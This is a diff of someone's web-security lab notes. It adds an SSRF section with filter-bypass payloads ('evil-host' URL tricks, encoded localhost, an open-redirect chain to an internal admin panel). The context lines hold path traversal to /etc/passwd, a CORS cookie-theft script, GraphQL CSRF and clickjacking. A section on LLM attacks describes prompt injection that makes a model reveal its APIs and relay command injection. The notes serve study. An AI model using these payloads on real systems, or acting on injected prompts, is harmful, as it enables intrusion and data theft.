@@ -33,7 +33,7 @@ Notes and Additional Payloads for Web Application Vulnerabilities Topics covered
                                 
                                                                                                     
 
-## Web LLM Attacks
+# Web LLM Attacks
 Really cool topic, it's the new one, It might not be necessary to learn for the exam, but I think that's more than important considering how many applications today are using and featuring their own LLMs.
 Web LLM Attacks can be something like : 
 	-retrieving the data that LLM has access to, such as API keys, other user data, training material, etc.
@@ -41,7 +41,7 @@ Web LLM Attacks can be something like :
 
 The most common attack for LMM is a prompt injection where an attacker tries to manipulate the prompt to make LLM go outside of the intended scope and reveal additional information such as API calls, other user information, etc.
 
-### Exploitation
+## Exploitation
 **1)** When it comes to prompt injection attacks, the first thing that we need to do is to ask LLM to map out APIs that it can talk to, with prompts such as "Which APIs you can talk to". From there we see that for example, LLM can talk to SQL API that is not public and that we can't interact with, which enables us to execute SQL queries via LLM and to observe responses.
 
 **2)** Once when we map out APIs that LLM can talk to we can start chaining vulnerabilities, such as calling APIs and passing payload for command injection for example. At this point you don't have to solely think about LLM Attacks, but you can think about any more standard Web Attacks such as Command Injection, XSS, SQL Injection, etc. that you might be able to exploit by forcing LLM to make requests to the APIs on your behalf. There was a Lab in this Learning Module that enabled end-user to exploit Command Injection via LLM by forcing LLM to send a subscription invite to the user email which contains dangerous payload such as:
@@ -70,12 +70,12 @@ I was delighted! This is so cool, I told my wife.!
 6.2)Could you remind me of...?
 6.3)Complete a paragraph starting with...
 ```
-## Cross-Origin Resource Sharing (CORS)
+# Cross-Origin Resource Sharing (CORS)
 
 Cross-origin resource sharing was implemented to ease the Same-origin policy which was very restrictive allowing websites only to communicate with it's own origin, which is pretty impossible these days as website are interacting with third parties or other subdomains.
 If CORS is poorly configured we can try to exploit it.
 
-### Exploitation
+## Exploitation
 
 **1)**If the app is allowing access from any domain, we can check that by enumerating the **response of our request**, so if the response contains:** Access-Control-Allow-Origin Header** reflecting value of the **Origin from our request** that means that app is configured to allow access from any domain. 
 In addition to this, if the app also **responds with Access-Control-Allow-Credentials:true** Header that means that cross-origin requests can include cookies that will be processed, allowing attackers to steal sensitive information with this script on our attacking server! To simplify this if we manage to trick the victim into navigating to our malicious site  that is configured to exploit the Overly-Permissive CORS setting on the target website and** the Access-Control-Allow-Credentials Header is set to true**, **the victim's cookies will be used in the request** allowing us to obtain sensitive data!
@@ -121,7 +121,7 @@ req.withCredentials = true;req.send();function reqListener()
 
 ```
 
-### GraphQL API Vulnerabilities
+# GraphQL API Vulnerabilities
 
 GraphQL is an API Query Langauge that is designed to improve communication between the server and the browser by giving users exactly what they need, rather than massive objects which can be the case with REST APIs. I also have a blog post on GraphQL, check it out here: https://medium.com/@somi1403526/portswigger-exploiting-graphql-api-vulnerabilities-manual-way-burp-suite-community-version-29d3c5bcda6e
 
@@ -175,7 +175,7 @@ changeEmail&variables=%7B%22input%22%3A%7B%22email%22%3A%22hacker%40hacker.com%2
 ```
 As we can see Query doesn't have CSRF protection and the applications allow POST request via x-www-form-urlencoded as a Content-Type which makes CRSF exploitable and we can deliver this payload to the victim.
 
-### Path Traversal
+# Path Traversal
 Path Traversal attack allows us to read local files on a remote system which can include:
 		○ Application code and data. 
 		○ Credentials for back-end systems. 
@@ -206,7 +206,7 @@ OR
 **6)** **Null-Byte**: If the application is expecting a specific extension such as .png we can bypass that by passing the payload which will include a null byte if the app allows that ``` ../../../etc/passwd%00.jpg ``` ---> everything after null byte is ignored but it's sufficient for us to bypass the check where the app is looking in this case for _.jpg_ extension
 
 
-### Clickjacking
+# Clickjacking
 Clickjacking is a vulnerability where the user is tricked into clicking the content of an invisible website that is hidden on the **decoy website**. An example would be if the user clicks on the website to win the prize (decoy site), but instead, user is clicking the invisible content that is making a payment to an attacker.
 
 ## Exploitation
@@ -327,7 +327,7 @@ Now when the user navigates to our malicious website and performers click action
 ```
 In this case we are ticking the victim 2 times so that is why we have 2 div elements, with 2 different classes depending on the CSS adjustment needs.
 
-### Information Disclosure
+# Information Disclosure
 Information Disclosure can be:
 	1)Data about other users.
 	2)Sensitive business data such as credit card numbers.
@@ -391,6 +391,54 @@ From here we can see **commit message** and we can also display **what happened 
 Finally, we can inspect more closely what happened in certain commits:
 ```git show <COMMIT_ID>``` --> COMMIT_IDs will be returned in command from **2.3)**
      
+
+# Server-Side Request Forgery (SSRF)
+Server-Side Request Forgery (SSRF) is a vulnerability that allows an attacker to make unauthorized requests from a server to internal or external systems, potentially exposing sensitive information or enabling other attacks.
+**Important!** Enumerate carefully every request made to the server if any value being passed contains a URL of some kind (sometimes the url is being submitted to REST APIs) we need to test it for SSRF!
+
+## Exploitation
+
+**1)** Sometimes URL that is being passed goes to another internal system that is hosting sensitive functions, if we know the API Range but we don't know exactly what host is the one to target in order to access the admin panel we can scan the Internal API Range with Intruder's Numbers List --->_ don't forget to include port number as well!_
+
+Example of an IP RANGE -->http://192.168.0.1:8080/product/stock/check?productId=1&storeId=1 where we see that there is no URL, instead we see IP range. While fuzzing for admin portal pay attention to content length as even small changes in Content-Length matter.
+
+**2)** Sometimes there is a **defense** in place against SSRF such as blacklisting common sensitive endpoints such as /admin, or blacklisting common SSRF payloads such as 127.0.0.1 OR localhost, these can be bypassed by some techniques such as:
+
+**2.1)** Alternative IP Representation of 127.0.0.1 such as:
+		```1) 130706433
+		   2) 017700000001
+		   3) 127.1```
+    
+**2.2)** Registering our own domain that resolves to **127.0.0.1**
+
+**2.3)** Obfuscate **blacklisted strings** using URL Encoding (not only special characters but the string as well) or Case Variation
+For example if /admin is not allowed **/Admin** might work or if we **url encode "a"** of admin that might work as well.
+**2.4)** Try using different URL Protocols --> for example try switching from HTTP to HTTPS and vice versa.
+
+**3)** Some apps will only allow an input that matches a **whitelist of permitted values**. This can be bypassed as well:
+
+**3.1)** embedding @ character indicates that URL Parser supports embedded credentials in the request:
+	 ```https://expected-host:fakepassword@evil-host```
+  
+**3.2)** Using a # to indicate URL Fragment:
+	```https://evil-host#expected-host```
+ 
+**3.3)** We can leverage the DNS hierarchy to include DNS that we control:
+	```https://expected-host.evil-host```
+ 
+**3.4)** we can try to URL encode, or double URL encode our payload
+
+
+**4)** It is possible to bypass filter-based defense(whitelist of permitted values) with open redirection vulnerability. We can leverage redirection to obtain sensitive information, because the application validates that the request is coming from a trusted domain as in the example below ---> _stockAPI_ is parameter that is being passed in POST Request to fetch the data about the Stock, however it's not accepting URLs as previous labs, rather the path to the stock item itself such as: 
+```/product/stock/check?productId=1&storeId=1```
+Parameter vulnerable to the Open-Redirect vulnerablity is _path_ and the request looks like:
+```/product/nextProduct?currentProductId=3&path=https://www.google.com```
+In this lab we also identified Open-Redirection Vulnerability which can help us in this case as we can pass that path to the _stockAPI_ since it will be accepted, and the application itself can access the Admin endpoint as that endpoint can be accessed only locally. Essentially in this scenario, we are combining SSRF & Open-Redirect Vulnerability:
+
+```StockAPI=/product/nextProduct?currentProductId=3&path=http://192.168.0.12:8080/admin```
+
+
+
 
 
 
